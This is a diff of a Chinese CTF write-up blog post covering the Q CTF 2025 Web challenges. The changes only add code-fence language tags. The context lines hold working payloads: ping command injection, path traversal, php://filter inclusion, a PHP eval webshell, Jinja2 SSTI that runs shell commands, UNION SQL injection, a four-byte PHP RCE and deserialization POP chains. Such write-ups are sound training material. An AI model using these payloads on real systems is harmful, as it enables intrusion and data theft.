@@ -4,19 +4,19 @@ description: "Q CTF 2025 Web方向比赛WP，整理解题思路、关键利用�
 pubDate: "2026-01-01"
 updatedDate: "2026-01-01"
 tags: ["CTF", "Web安全", "WP"]
-cover: auto
+cover: "ff919a501ddc753bf39a8da544ca28a46249a36d_raw..jpg"
 coverAlt: "Q CTF2025 Web 题解汇总 的文章封面"
 draft: false
 ---
 ## git
 
-```
+```bash
 githacker --url http://ctf.a1natas.com:21671/.git --output-folder git
 ```
 
 先拿一下.git，
 
-```
+```bash
 git cat-file -p b8890f612f9e361abca3b66c31ad8a689ee52bfa
 ```
 
@@ -24,11 +24,11 @@ git cat-file -p b8890f612f9e361abca3b66c31ad8a689ee52bfa
 
 ## ping
 
-```
+```bash
 127.0.0.1; find / -name fl*
 ```
 
-```
+```bash
 127.0.0.1;cat fl*
 ```
 
@@ -36,15 +36,15 @@ git cat-file -p b8890f612f9e361abca3b66c31ad8a689ee52bfa
 
 ## http
 
-```
+```text
 User-Agent: ?CTFBrowser
 ```
 
-```
+```http
 GET /?welcome=to HTTP/1.1
 ```
 
-```
+```http
 POST /?welcome=to HTTP/1.1
 Host: ctf.a1natas.com:27037
 Cache-Control: max-age=0
@@ -60,15 +60,15 @@ Content-Length: 10
 the=?CTF
 ```
 
-```
+```text
 Cookie:wishu=happiness
 ```
 
-```
+```text
 Referer:?CTF
 ```
 
-```
+```text
 X-Forwarded-For:127.0.0.1
 ```
 
@@ -76,7 +76,7 @@ X-Forwarded-For:127.0.0.1
 
 利用php特性，传2025a，或者利用intval，传0x7E9或者03751
 
-```
+```text
 a=QNKCDZO&b=240610708&aa[]=1&bb[]=2&aaa=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&bbb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
 ```
 
@@ -86,7 +86,7 @@ a=QNKCDZO&b=240610708&aa[]=1&bb[]=2&aaa=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D
 
 或者直接控制台
 
-```
+```javascript
 atob('ZmxhZ3syODgxODM1OC0zY2Q2LTQzYzktOTQzNC05NTQwYWFlZWYzM2J9')
 ```
 
@@ -96,13 +96,13 @@ atob('ZmxhZ3syODgxODM1OC0zY2Q2LTQzYzktOTQzNC05NTQwYWFlZWYzM2J9')
 
 直接路径穿越
 
-```
+```text
 ../../../../flag.txt
 ```
 
 ## 文件包含
 
-```
+```text
 ?url=php://filter/resource=/flag
 ```
 
@@ -110,25 +110,25 @@ atob('ZmxhZ3syODgxODM1OC0zY2Q2LTQzYzktOTQzNC05NTQwYWFlZWYzM2J9')
 
 传一个图片马，该题目会把jpg png gif 当作php解析
 
-```
+```php
 <?php @eval($_POST['cmd']);?>
 ```
 
 ## 正则表达式
-```
+```php
 if(preg_match('/^-(ctf|CTF)<\n>{5}[h-l]\d\d\W+@email\.com flag.\b$/', $_？) && strlen($_？) == 40)
 ```
 
-```
+```text
 -ctf<
 >>>>>h11..........@email.com flaga
 ```
 
-```
+```text
 \QPlease%5C%20777give%2B.%20!me%3F%3C%3D-%3D%3E(.*)Flaggg0\E(?#111111111111111111111111111111111111111111111111121111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111)
 ```
 
-```
+```text
 .*(?#111111111111111111111111111111111111111111111111121111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111)
 ```
 
@@ -136,19 +136,19 @@ if(preg_match('/^-(ctf|CTF)<\n>{5}[h-l]\d\d\W+@email\.com flag.\b$/', $_？) && 
 
 fenjing秒了
 
-```
+```text
 {% set c = config.__init__.__globals__.__builtins__.chr %}{% set os_str = c(111)+c(115) %}{% set cmd = c(108)+c(115)+c(32)+c(47) %}{{ config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read() }}
 ```
 
-```
+```text
 {%25+set+c+%3D+config.__init__.__globals__.__builtins__.chr+%25}+{%25+set+os_str+%3D+c(111)%2Bc(115)+%25}+{%25+set+cmd+%3D+c(108)%2Bc(115)%2Bc(32)%2Bc(47)+%25}+{{+config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read()+}}
 ```
 
-```
+```text
 {% set c = config.__init__.__globals__.__builtins__.chr %}{% set os_str = c(111)+c(115) %}{% set cmd = c(99)+c(97)+c(116)+c(32)+c(47)+c(102)+c(108)+c(97)+c(103) %}{{ config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read() }}
 ```
 
-```
+```text
 %7b%25%20%73%65%74%20%63%20%3d%20%63%6f%6e%66%69%67%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%63%68%72%20%25%7d%7b%25%20%73%65%74%20%6f%73%5f%73%74%72%20%3d%20%63%28%31%31%31%29%2b%63%28%31%31%35%29%20%25%7d%7b%25%20%73%65%74%20%63%6d%64%20%3d%20%63%28%39%39%29%2b%63%28%39%37%29%2b%63%28%31%31%36%29%2b%63%28%33%32%29%2b%63%28%34%37%29%2b%63%28%31%30%32%29%2b%63%28%31%30%38%29%2b%63%28%39%37%29%2b%63%28%31%30%33%29%20%25%7d%7b%7b%20%63%6f%6e%66%69%67%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%6f%73%5f%73%74%72%29%2e%70%6f%70%65%6e%28%63%6d%64%29%2e%72%65%61%64%28%29%20%7d%7d
 ```
 
@@ -158,11 +158,11 @@ fenjing秒了
 
 以id为注入点进行sql，
 
-```
+```sql
 ?id=-1' union select hex(group_concat(column_name)),2,3 from information_schema.columns where table_name=0x666c616773--+
 ```
 
-```
+```sql
 ?id=-1' union select group_concat(flag),2,3 from flags--+
 ```
 
@@ -172,7 +172,7 @@ fenjing秒了
 
 改对象调用链，因为源码中merge是对我们的输入递归调用的
 
-```
+```json
 {
     "__init__": {
         "__globals__": {
@@ -188,23 +188,23 @@ fenjing秒了
 
 后续原理使利用自定义变量和取反操作实现命令执行
 
-```
+```php
 $_=~payload;`$_`;
 ```
 
 可知这是一个四字节rce，反引号执行系统命令，我们可以通过，>和*来实现缩短命令，具体知识可搜索四字节rce学习一下
 
-```
+```text
 ?c1n%5By0.u%20g3t%2Bfl%26g%3F=$_=~%C1%9C%9E%8B;`$_`;
 ```
 
 先传一个cat，然后使用*匹配cat，将后面的文件输出到=文件中
 
-```
+```bash
 >cat          *>=
 ```
 
-```
+```text
 ?c1n%5By0.u%20g3t%2Bfl%26g%3F=$_=~%D5%C1%C2;`$_`;
 ```
 
@@ -214,7 +214,7 @@ $_=~payload;`$_`;
 
 一个简单的pop链一层一层去套就好了没有什么复杂的绕过
 
-```
+```php
 <?php 
 class Wuhuarou{
     public $Wuhuarou;
@@ -267,7 +267,7 @@ echo urlencode(serialize($wuhuarou));
 
 php反序列化
 
-```
+```php
 <?php 
 class Wuhuarou{
     public $Wuhuarou;
@@ -322,7 +322,7 @@ echo urlencode(serialize($wuhuarou));
 
 审一下/src的源码，题目中doit端口存在一个eval代码执行，不过无回显，我们可以当成盲注
 
-python```
+```python
 import requests
 import time
 
